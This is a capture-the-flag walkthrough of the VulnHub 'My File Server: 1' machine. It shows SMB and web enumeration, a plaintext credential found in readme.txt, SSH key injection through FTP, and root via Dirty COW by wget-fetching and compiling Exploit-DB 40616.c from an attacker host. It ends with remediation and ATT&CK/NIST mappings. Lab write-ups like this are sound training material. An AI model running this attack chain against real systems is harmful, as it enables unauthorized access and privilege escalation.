# My File Server: 1 — When Anonymous FTP Meets a Dirty COW

Alright guys!! Who would have thought that a "file server" CTF would hand you credentials sitting in a web-accessible text file and then let you inject SSH keys through an anonymous FTP write? And just when you think the story is over, a crusty old kernel is waiting for a Dirty COW date. This machine is a masterclass in why defense-in-depth matters: every layer was misconfigured independently, and together they form a perfect kill chain. Legit one of the more realistic "enterprise-gone-wrong" scenarios you will find on VulnHub, no cap.

Big respect to the creator for building a machine that teaches FTP abuse, credential exposure, SSH key injection, and kernel exploitation in one box. fr fr.

---

| Field | Value |
|---|---|
| **Level** | Easy |
| **Target VM** | My File Server: 1 |
| **Attacker VM** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/my-file-server-1,432/ |
| **Techniques** | Nmap, SMB user enumeration (smbmap), Nikto web scan, anonymous FTP SSH key injection, Dirty COW kernel exploit (CVE-2016-5195) |
| **CVEs** | CVE-2016-5195 (Dirty COW — Linux kernel privilege escalation), CWE-522 (Insufficiently Protected Credentials), CWE-284 (Improper Access Control — anonymous FTP write) |
| **APT Groups** | APT41: known to exploit misconfigured file-sharing services (FTP, SMB) for initial access in enterprise environments; FIN7: documented use of exposed credential files and writable network shares for lateral movement and persistence |

---

## Attack Summary

```
netdiscover / nmap
    |
    v
nmap: FTP 21 (anonymous write) + HTTP 80 + SMB 139/445 + SSH 22
    |
    v
smbmap: reveals username 'smbuser'
    |
    v
nikto: flags readme.txt in web root -> smbuser:rootroot1 (plaintext)
    |
    v
FTP login as smbuser -> writable home dir
    |
    v
SSH keygen -> upload authorized_keys via FTP -> SSH login as smbuser
    |
    v
uname -a -> outdated kernel -> CVE-2016-5195 (Dirty COW)
    |
    v
wget exploit 40616.c -> gcc compile -> ./raj
    |
    v
uid=0(root) gid=0(root) -> cat /root/proof.txt
```

---

## Methodology

1. Host discovery and full port scan to identify all exposed services
2. SMB enumeration to harvest valid usernames
3. Web enumeration to locate plaintext credentials in readme.txt
4. Anonymous FTP write access to inject SSH public key into smbuser home directory
5. SSH login using the injected key pair
6. Kernel version fingerprinting and Dirty COW exploitation for root

---

## Step 1 — Host Discovery

```bash
netdiscover -r 192.168.29.0/24
```

ARP-based host discovery to identify the target on the local segment. Take note of the IP.

```bash
# Export as variable for reuse
export TARGET=192.168.29.123
```

**MITRE ATT&CK:** T1595.001 — Active Scanning: Scanning IP Blocks

---

## Step 2 — Port and Service Enumeration

```bash
nmap -p- -A $TARGET
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 21 | FTP (vsftpd) | Anonymous login enabled |
| 22 | SSH | OpenSSH |
| 80 | HTTP | Apache web server |
| 139/445 | SMB | Samba file sharing |

FTP with anonymous login on a server that also runs SSH and SMB is a red flag: it suggests the box was configured by someone who "just made it work" without thinking about what each service exposes.

**Alternative:** `rustscan -a $TARGET -- -A -sV` for faster scanning.

**MITRE ATT&CK:** T1046 — Network Service Discovery

---

## Step 3 — SMB Enumeration

```bash
smbmap -H $TARGET
```

Output reveals a local username: `smbuser`. SMB enumeration without credentials (null session) often exposes usernames, share names, and sometimes file listings.

```bash
# Additional: list shares and try null session
smbclient -L \\\\$TARGET\\ -N
enum4linux -a $TARGET
```

**Real-world note:** Null session SMB enumeration was a major attack vector in the Windows 2000/XP era. While modern Windows requires authentication, many Linux Samba deployments still allow null sessions. APT41 has used SMB enumeration as an early reconnaissance step in multiple documented campaigns against healthcare and technology organizations.

**MITRE ATT&CK:** T1021.002 — Remote Services: SMB/Windows Admin Shares; T1087.002 — Account Discovery: Domain Account

---

## Step 4 — Web Enumeration and Credential Discovery

```bash
nikto -h http://$TARGET
```

Nikto flags a readable `readme.txt` at the web root. Always read everything Nikto reports, even the "informational" items.

```bash
curl http://$TARGET/readme.txt
```

Output:

```
smbuser:rootroot1
```

Plaintext credentials sitting in a web-accessible file. This is CWE-522 in its purest form. The username discovered via smbmap matches the credential here: the enumeration steps are connecting.

**Alternative enumeration:**

```bash
gobuster dir -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/common.txt -x txt,bak,conf
```

**Real-world note:** Exposed credential files in web roots are a consistent finding in real penetration tests. CISA Alert AA22-074A documented multiple threat actors actively scanning for `.env`, `readme.txt`, `config.php.bak`, and similar files as initial access vectors against internet-facing web servers.

**MITRE ATT&CK:** T1083 — File and Directory Discovery; T1552.001 — Unsecured Credentials: Credentials in Files

---

## Step 5 — SSH Key Injection via FTP

Direct SSH password login times out due to server configuration (`/etc/ssh/sshd_config` likely has `PasswordAuthentication no`). However, FTP is writable into the user's home directory. That is the bypass.

**Generate SSH key pair on attacker:**

```bash
ssh-keygen -t rsa -b 4096 -f /root/.ssh/myfileserver_rsa -N ""
```

**Log in via FTP and upload the public key:**

```bash
ftp $TARGET
# Username: smbuser
# Password: rootroot1
ftp> mkdir /home/smbuser/.ssh
ftp> cd /home/smbuser/.ssh
ftp> put /root/.ssh/myfileserver_rsa.pub authorized_keys
ftp> bye
```

**Connect via SSH using the private key:**

```bash
ssh -i /root/.ssh/myfileserver_rsa smbuser@$TARGET
```

You are now logged in as `smbuser`. The FTP write access turned into SSH without ever needing to know the SSH password, because `authorized_keys` is the bypass.

**Real-world note:** This is a documented post-exploitation technique. When FTP write access is available to a user's home directory and SSH accepts key-based authentication, an attacker can achieve persistent access without modifying `/etc/passwd`, creating backdoor accounts, or triggering any obvious audit event. The technique is referenced in CISA's advisory on Linux intrusion persistence patterns.

**MITRE ATT&CK:** T1098.004 — Account Manipulation: SSH Authorized Keys; T1021.004 — Remote Services: SSH

---

## Step 6 — Privilege Escalation via Dirty COW (CVE-2016-5195)

Check the kernel version first:

```bash
uname -a
```

If the kernel is older than 4.8.3, it is likely vulnerable to Dirty COW. The exploit abuses a race condition in the Linux kernel's copy-on-write mechanism to write to read-only memory mappings, enabling privilege escalation.

Fetch the exploit from Exploit-DB (EDB-ID 40616):

```bash
# On attacker: serve the exploit
python3 -m http.server 8000

# On target:
wget http://192.168.29.208:8000/40616.c -O /tmp/40616.c
cd /tmp
gcc 40616.c -o raj -pthread
./raj
```

The exploit overwrites `/etc/passwd` to add a root-level entry, then drops to a root shell:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/proof.txt
```

(☞ﾟヮﾟ)☞ Root. Dirty COW does not miss.

**Real-world note:** CVE-2016-5195 (Dirty COW) is in the CISA Known Exploited Vulnerabilities catalog. It was actively exploited in the wild by multiple threat actors including APT32 (OceanLotus) against Linux-based targets in Asia Pacific in 2017-2018. The race condition has been patched in kernels 4.8.3+, but thousands of unpatched legacy servers still exist in production environments.

**MITRE ATT&CK:** T1068 — Exploitation for Privilege Escalation

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|---|---|---|---|
| Credential (plaintext) | `smbuser:rootroot1` | `/readme.txt` web root | FTP login + SSH key injection |
| Username | `smbuser` | smbmap null session enum | Confirmed via readme.txt |
| Root flag | `proof.txt` | `/root/proof.txt` | Dirty COW CVE-2016-5195 |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---|---|---|
| 1 | Anonymous FTP with write access to user home directory | Thousands of production FTP servers still allow anonymous write; enables key injection without SSH password | Disable anonymous FTP; use SFTP with key-only auth; restrict FTP to read-only chroot jails |
| 2 | Credentials in plaintext web-accessible file (readme.txt) | Exposed credential files are actively scanned for by threat actors per CISA AA22-074A; direct first-step initial access | Audit web root for sensitive files; never store credentials in web-accessible paths |
| 3 | SMB null session exposing valid usernames | Username harvesting via null session is a consistent finding in enterprise Linux/Samba environments | Disable SMB null sessions; configure Samba with `restrict anonymous = 2` |
| 4 | CVE-2016-5195 (Dirty COW) unpatched kernel | Active exploitation by APT32 and multiple ransomware operators; in CISA KEV catalog | Maintain kernel patch cadence; automate security update deployment |
| 5 | SSH key authentication only without FTP write restriction | Defense bypass when individual controls are not coordinated: disabling password SSH is good, but not enough if FTP is writable | Defense-in-depth: no single control assumption; restrict FTP write and SSH keys together |

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP ID |
|---|---|---|---|
| Reconnaissance | Discovery | Active Scanning: Scanning IP Blocks | T1595.001 |
| Reconnaissance | Discovery | Network Service Discovery | T1046 |
| Credential Access | Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Discovery | Discovery | Account Discovery: Local Account | T1087.001 |
| Discovery | Discovery | File and Directory Discovery | T1083 |
| Lateral Movement | Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |
| Persistence | Persistence | Account Manipulation: SSH Authorized Keys | T1098.004 |
| Lateral Movement | Lateral Movement | Remote Services: SSH | T1021.004 |
| Privilege Escalation | Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Execution | Execution | Command and Scripting Interpreter: Unix Shell | T1059.004 |

---

## Remediation and Containment

### Technical Fixes

1. **Disable anonymous FTP write access:** configure vsftpd with `anonymous_enable=NO`; if anonymous read is required, restrict to a separate chroot with no write permissions
2. **Remove credentials from web-accessible files:** audit the entire web root for `.txt`, `.bak`, `.conf`, `.sql` files; implement automated scanning in CI/CD
3. **Restrict FTP directory permissions:** ensure FTP home directories are not world-writable; set `local_umask=022` in vsftpd.conf
4. **Patch the kernel:** update to kernel 4.8.3 or later; apply all available distribution security patches; automate with `unattended-upgrades` or equivalent
5. **Disable SMB null sessions:** configure Samba with `restrict anonymous = 2` and require valid authentication for all share access

### MITRE D3FEND Countermeasures

- **D3-ACH** — Application Configuration Hardening (disable FTP anonymous write; harden vsftpd)
- **D3-OAM** — Operating System Administrative Management (kernel patch management)
- **D3-HBPI** — Harden Build Pipeline Integrity (no credentials in web root artifacts)
- **D3-NTF** — Network Traffic Filtering (firewall FTP to authorized hosts only)

### NIST CSF 2.0

| Function | Category | Action |
|---|---|---|
| Identify | Asset Management | Inventory all FTP and SMB services; document write access controls |
| Protect | Access Control | Disable anonymous FTP write; require authentication for all file shares |
| Protect | Data Security | Remove credential files from web-accessible paths; enforce least privilege on web root |
| Detect | Anomalies and Events | Alert on anonymous FTP write events; monitor for SSH key additions |
| Respond | Response Planning | Rotate credentials on discovery; revoke unauthorized SSH keys |
| Recover | Recovery Planning | Rebuild from known-good image; audit all accounts and keys |

### NIST SP 800-53 Rev. 5

| Control | Description | Application |
|---|---|---|
| AC-3 | Access Enforcement | Restrict FTP write; require SMB authentication |
| AC-6 | Least Privilege | Anonymous FTP read-only at most; never write |
| CM-6 | Configuration Settings | Disable anonymous FTP write in vsftpd.conf |
| CM-7 | Least Functionality | Disable FTP entirely if SFTP is available |
| RA-5 | Vulnerability Scanning | Regular kernel CVE scanning; automate patching |
| SC-28 | Protection of Information at Rest | No credentials in web-accessible files |

### CISA KEV

CVE-2016-5195 (Dirty COW) is catalogued in the CISA Known Exploited Vulnerabilities database. Organizations are required to patch this vulnerability under CISA BOD 22-01 for federal agencies, and the advisory is recommended for all organizations. Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domain | Practice | Target MIL |
|---|---|---|
| Asset, Change, and Configuration Management (ASSET) | Manage IT Asset Inventory | MIL2 |
| Threat and Vulnerability Management (THREAT) | Perform Vulnerability Assessments | MIL2 |
| Identity and Access Management (IAM) | Manage Privileges and Accounts | MIL3 |

---

## Final Thoughts

My File Server: 1 is deceptively simple but teaches something important: you do not need a sophisticated zero-day to compromise a machine. Anonymous FTP write plus exposed credentials plus an unpatched kernel is a chain that exists in real production environments right now. Every step in this machine maps directly to real-world attacker playbooks.

The name "My File Server" is almost too on-the-nose: this is exactly the kind of box that some sysadmin set up in 2016, forgot about, and never patched. If you find something like this in a pentest engagement, it is not a corner case. It is a case study in why patch management and configuration hygiene matter together.

Keep grinding, dude. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
